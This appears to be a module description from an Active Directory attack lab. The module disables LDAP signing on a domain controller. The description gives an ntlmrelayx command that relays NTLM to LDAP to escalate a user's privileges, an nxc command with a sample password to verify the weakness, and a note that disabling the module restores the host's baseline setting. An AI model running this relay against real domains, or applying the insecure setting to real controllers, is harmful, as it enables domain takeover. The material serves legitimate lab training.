# ldap-signing-off

DC does not require LDAP signing. Sets `ldap.signing` to `none` on a domain controller (default: the root DC).

Attack:

Relay NTLM authentication to LDAP on the DC:

    ntlmrelayx.py -t ldap://<dc ip> --escalate-user <user>

How to verify:

    nxc ldap <dc ip> -u <user> -p 'Aa1234567890!' -M ldap-checker   # signing not required when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
